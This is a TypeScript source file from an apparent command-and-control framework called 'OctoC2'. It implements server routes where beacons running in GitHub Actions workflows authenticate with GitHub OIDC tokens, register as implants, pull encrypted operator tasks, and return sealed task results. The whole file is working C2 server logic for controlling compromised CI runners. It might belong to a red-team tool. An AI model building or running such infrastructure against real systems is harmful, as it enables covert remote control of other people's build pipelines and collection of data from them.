/**
 * OctoC2 Server — OIDC Routes
 *
 * Handles HTTP endpoints for the OidcTentacle channel:
 *
 *   POST /api/oidc/checkin  — verify OIDC JWT, register beacon, return tasks
 *   POST /api/oidc/result   — verify OIDC JWT, store task result
 *
 * Authentication is performed by verifying the GitHub-issued OIDC JWT against
 * GitHub's JWKS endpoint.  No Bearer token or pre-shared secret is required
 * from the beacon — the JWT is the proof of identity.
 *
 * The `beaconId` is derived deterministically from the `repository` claim in
 * the JWT so the same Actions workflow always maps to the same beacon slot.
 */

import { createHash }              from "node:crypto";
import { createRemoteJWKSet, jwtVerify } from "jose";
import type { BeaconRegistry }     from "../BeaconRegistry.ts";
import type { TaskQueue }          from "../TaskQueue.ts";
import {
  encryptForBeacon,
  base64ToBytes,
}                                  from "../crypto/sodium.ts";

// ── JWKS ─────────────────────────────────────────────────────────────────────

const GITHUB_OIDC_ISSUER = "https://token.actions.githubusercontent.com";
const GITHUB_JWKS_URL    = `${GITHUB_OIDC_ISSUER}/.well-known/jwks`;
const OIDC_AUDIENCE      = "github-actions";

/** Module-level JWKS set — cached so it is not re-fetched on every request. */
export const JWKS = createRemoteJWKSet(new URL(GITHUB_JWKS_URL));

// ── Helpers ───────────────────────────────────────────────────────────────────

/**
 * Derive a stable 16-hex-char beaconId from a `repository` claim string
 * (e.g. "owner/repo") using SHA-256.
 */
export function beaconIdFromRepository(repository: string): string {
  return createHash("sha256").update(repository).digest("hex").slice(0, 16);
}

/**
 * Verify a GitHub OIDC JWT and return its payload.
 * Returns null if verification fails for any reason.
 */
export async function verifyOidcJwt(jwt: string): Promise<Record<string, unknown> | null> {
  try {
    const { payload } = await jwtVerify(jwt, JWKS, {
      issuer:   GITHUB_OIDC_ISSUER,
      audience: OIDC_AUDIENCE,
    });
    return payload as Record<string, unknown>;
  } catch {
    return null;
  }
}

// ── OidcRoutes ─────────────────────────────────────────────────────────────────

export interface OidcRoutesConfig {
  registry:          BeaconRegistry;
  taskQueue:         TaskQueue;
  operatorSecretKey: Uint8Array;
}

export class OidcRoutes {
  private readonly registry:          BeaconRegistry;
  private readonly taskQueue:         TaskQueue;
  private readonly operatorSecretKey: Uint8Array;

  constructor(config: OidcRoutesConfig) {
    this.registry          = config.registry;
    this.taskQueue         = config.taskQueue;
    this.operatorSecretKey = config.operatorSecretKey;
  }

  /** Dispatch an OIDC route. Returns null if the path does not match. */
  async handle(req: Request, pathname: string): Promise<Response | null> {
    if (req.method === "POST" && pathname === "/api/oidc/checkin") {
      return this.postCheckin(req);
    }
    if (req.method === "POST" && pathname === "/api/oidc/result") {
      return this.postResult(req);
    }
    return null;
  }

  // ── POST /api/oidc/checkin ─────────────────────────────────────────────────

  private async postCheckin(req: Request): Promise<Response> {
    let body: { jwt?: string; pubkey?: string };
    try {
      body = await req.json() as { jwt?: string; pubkey?: string };
    } catch {
      return this.err("invalid JSON body", 400);
    }

    if (typeof body.jwt !== "string" || !body.jwt) {
      return this.err("jwt is required", 400);
    }

    const payload = await verifyOidcJwt(body.jwt);
    if (!payload) {
      return this.err("unauthorized", 401);
    }

    const repository = payload["repository"] as string | undefined;
    if (!repository) {
      return this.err("JWT missing repository claim", 400);
    }

    const beaconId = beaconIdFromRepository(repository);
    const pubkey   = typeof body.pubkey === "string" ? body.pubkey : null;

    // Register/update the beacon in the registry
    if (pubkey) {
      const existing = this.registry.get(beaconId);
      this.registry.register({
        beaconId,
        issueNumber: existing?.issueNumber ?? 0,
        publicKey:   pubkey,
        hostname:    repository,
        username:    "actions",
        os:          "linux",
        arch:        "x64",
        seq:         (existing?.lastSeq ?? 0) + 1,
        tentacleId:  7,
      });
    }

    const beacon = this.registry.get(beaconId);

    // Fetch and encrypt any pending tasks
    const pending = this.taskQueue.getPendingTasks(beaconId);
    const encryptedTasks: Array<{ taskId: string; nonce: string; ciphertext: string }> = [];

    if (beacon && pending.length > 0) {
      let beaconPublicKey: Uint8Array;
      try {
        beaconPublicKey = await base64ToBytes(beacon.publicKey);
      } catch {
        beaconPublicKey = new Uint8Array(32);
      }

      for (const task of pending) {
        try {
          const taskObj = {
            taskId: task.taskId,
            kind:   task.kind,
            args:   task.args,
            ref:    task.ref,
          };
          const { nonce, ciphertext } = await encryptForBeacon(
            JSON.stringify(taskObj),
            beaconPublicKey,
            this.operatorSecretKey,
          );
          encryptedTasks.push({ taskId: task.taskId, nonce, ciphertext });
          this.taskQueue.markDelivered(task.taskId);
        } catch {
          // Skip tasks that fail to encrypt
        }
      }
    }

    return this.json({ tasks: encryptedTasks });
  }

  // ── POST /api/oidc/result ──────────────────────────────────────────────────

  private async postResult(req: Request): Promise<Response> {
    let body: { jwt?: string; taskId?: string; sealed?: string };
    try {
      body = await req.json() as { jwt?: string; taskId?: string; sealed?: string };
    } catch {
      return this.err("invalid JSON body", 400);
    }

    if (typeof body.jwt !== "string" || !body.jwt) {
      return this.err("jwt is required", 400);
    }

    const payload = await verifyOidcJwt(body.jwt);
    if (!payload) {
      return this.err("unauthorized", 401);
    }

    if (typeof body.taskId !== "string" || !body.taskId) {
      return this.err("taskId is required", 400);
    }

    const sealed   = typeof body.sealed === "string" ? body.sealed : "";
    const completed = this.taskQueue.markCompleted(body.taskId, sealed);

    if (!completed) {
      // Task not found or already closed — still return ok (idempotent)
    }

    return this.json({ ok: true });
  }

  // ── Helpers ────────────────────────────────────────────────────────────────

  private json(data: unknown, status = 200): Response {
    return new Response(JSON.stringify(data), {
      status,
      headers: { "Content-Type": "application/json" },
    });
  }

  private err(message: string, status: number): Response {
    return this.json({ error: message }, status);
  }
}
